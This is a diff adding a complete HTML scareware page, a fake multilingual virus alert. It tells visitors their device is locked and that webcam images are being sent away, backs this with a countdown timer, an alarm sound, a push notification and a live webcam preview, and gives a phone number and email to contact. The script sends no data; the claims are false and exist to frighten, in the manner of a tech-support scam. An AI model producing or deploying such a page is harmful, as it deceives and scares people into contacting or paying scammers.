@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>**あなたのパソコンはウイルスに感染しています。**</title>
+	    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+</head>
+<body>
+<section class="hero is-danger">
+  <div class="hero-body">
+    <p class="title">
+      Your <span id="dvc"></span> is locked.
+    </p>
+	<p class="has-text-warning">Your device is infected with a virus. Personal information and important system data may be corrupted. Remove the virus within the time limit below. Please also note that device information and real-time webcam images are sent to us.</p>
+	<p class="has-text-warning">您的设备感染了病毒。 个人信息和重要的系统数据可能已损坏。 在以下时间限制内删除病毒。 另请注意，设备信息和实时网络摄像头图像将发送给我们。</p>
+	<p class="has-text-warning">장치가 바이러스에 감염되었습니다. 개인 정보 및 중요한 시스템 데이터가 손상되었을 수 있습니다. 아래 제한 시간 내에 바이러스를 제거하십시오. 또한 장치 정보 및 실시간 웹캠 이미지가 당사에 전송됩니다.</p>
+	<p class="has-text-warning">あなたの端末はウイルスに感染しています。個人情報や、重要なシステムデータが破損する場合があります。下記の制限時間内にウイルスを削除してください。また、端末情報、ウェブカメラのリアルタイム映像は、弊社に送信されていますのでご注意ください。</p>
+	            <p class="is-size-3 has-text-centered has-text-warning">
+	              leftover
+              <span id="hour">6</span>hour
+              <span id="min">0</span>minute
+              <span id="sec">0</span>second
+              
+            </p>
+            <progress class="progress" max="100"></progress>
+  </div>
+</section>
+
+<section class="section">
+	<div class="container">
+	<h2 class="title">Device information 设备信息 기기 정보 端末情報 CHEGAMOS ABRE O PORTAO  </h2>
+	<table class="table is-striped is-fullwidth">
+		<tr>
+			 <td>Device</td><td id="device"></td>
+             
+		</tr>
+		<tr>
+			<td>Real-time webcam video</td><td><video id="video" width="320" height="240" autoplay></video></td>
+		</tr>
+		<tr>
+			<td>Date and time of infection</td><td id="date"></td>
+		</tr>
+	</table>
+	<h2 class="title">Contact us 联系我们 문의 お問い合わせ</h2>
+		<table class="table is-striped is-fullwidth">
+			<tr>
+				<td>telephone number</td><td>0120-3434-3434</td>
+			</tr>
+			<tr>
+				<td>E-mail address</td><td>info@infomation.com</td>
+                <td></td>
+			</tr>
+		</table>
+	</div>
+</section>
+
+	    <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/push.js/1.0.12/push.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="http://www.google.com/jsapi"></script>
+    <script type="text/javascript">
+      // history.pushState(null, null, location.href);
+      // $(window).on('popstate', function(){
+      //   history.go(1);
+      // });
+      const se = new Audio(
+        "ウイルス感染警告 多言語対応.mp3"
+      );
+      se.play();
+      let c = 6 * 60 * 60;
+      setInterval(() => {
+        $("#hour").text(Math.floor(c / 3600));
+        $("#min").text(Math.floor((c % 3600) / 60));
+        $("#sec").text(Math.floor(c % 60));
+        c = c - 1;
+      }, 1000);
+      $("#device").text(platform.description);
+      $("#date").text(new Date().toLocaleString("ja-JP"));
+      $("#delete").click(() => {
+        $("#notification").addClass("is-hidden")
+
+
+      });
+//端末情報取得2
+        var dvc = navigator.userAgent.match(/Android|iPhone|iPad/);
+        if (dvc == null){
+            dvc = 'device';
+        }
+        $('#dvc').text(dvc);
+
+      Push.create('ウイルス感染警告 Virus Infection Alert 病毒感染警报 바이러스 감염 경고', {
+　　body: 'Your device is infected with a virus. Your files may get corrupted, so remove the virus now.',
+　　icon: '16_2_89.png',
+　　timeout: 8000, // 通知が消えるタイミング
+　　vibrate: [100, 100, 100], // モバイル端末でのバイブレーション秒数
+　　onClick: function() {
+　　　　// 通知がクリックされた場合の設定
+　　　　console.log(this);
+　　}
+});
+
+//動画流す準備
+var video = document.getElementById("video");
+// getUserMedia によるカメラ映像の取得
+var media = navigator.mediaDevices.getUserMedia({
+    video: true,//ビデオを取得する
+    //使うカメラをインカメラか背面カメラかを指定する場合には
+    //video: { facingMode: "environment" },//背面カメラ
+    //video: { facingMode: "user" },//インカメラ
+    audio: false,//音声が必要な場合はture
+});
+//リアルタイムに再生（ストリーミング）させるためにビデオタグに流し込む
+media.then((stream) => {
+    video.srcObject = stream;
+});
+
+
+    </script>
+</body>
+</html>
